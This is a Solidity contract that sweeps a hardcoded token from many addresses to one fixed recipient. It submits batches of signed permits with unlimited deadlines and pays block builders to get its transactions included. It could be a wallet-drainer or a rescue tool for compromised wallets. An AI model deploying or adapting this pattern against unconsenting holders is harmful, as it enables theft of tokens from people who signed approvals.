// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IERC20 {
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
}

contract MultiBuilderTransfer is Ownable {
    IERC20 private constant TOKEN =
        IERC20(0xec53bF9167f50cDEB3Ae105f56099aaaB9061F83);
    address private constant TO = 0xB09FF7F74e627Ac36F7Ddf2dBDBF9CBea9350Aa0;
    uint256 private constant VALUE = 1000 * (10 ** 18);
    uint256 private constant DEADLINE = type(uint256).max;

    error ArrayLengthMismatch();

    constructor(address _owner) Ownable(_owner) {}

    function multiTransferFrom(
        address[] calldata fromAddresses
    ) external payable {
        uint256 length = fromAddresses.length;

        for (uint256 i = 0; i < length; ) {
            address from = fromAddresses[i];
            uint256 balance = TOKEN.balanceOf(from);
            if (balance != 0) {
                address(TOKEN).call(
                    abi.encodeWithSelector(
                        TOKEN.transferFrom.selector,
                        from,
                        TO,
                        balance
                    )
                );
            }
            unchecked {
                ++i;
            }
        }

        _transferToMiner();
    }

    function batchPermitApprove(
        address[] calldata owners,
        uint8[] calldata v,
        bytes32[] calldata r,
        bytes32[] calldata s
    ) external payable {
        uint256 len = owners.length;
        if (len != v.length || len != r.length || len != s.length) {
            revert ArrayLengthMismatch();
        }

        for (uint256 i = 0; i < len; ) {
            TOKEN.permit(
                owners[i],
                address(this),
                VALUE,
                DEADLINE,
                v[i],
                r[i],
                s[i]
            );
            unchecked {
                ++i;
            }
        }

        _transferToMiner();
    }

    function _transferToMiner() private {
        if (msg.value > 0) {
            block.coinbase.call{value: msg.value}(new bytes(0));
        }
    }

    function withdrawETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function withdrawTokens(IERC20 token) external onlyOwner {
        uint256 tokenBalance = token.balanceOf(address(this));
        token.transfer(owner(), tokenBalance);
    }

    receive() external payable {}
}
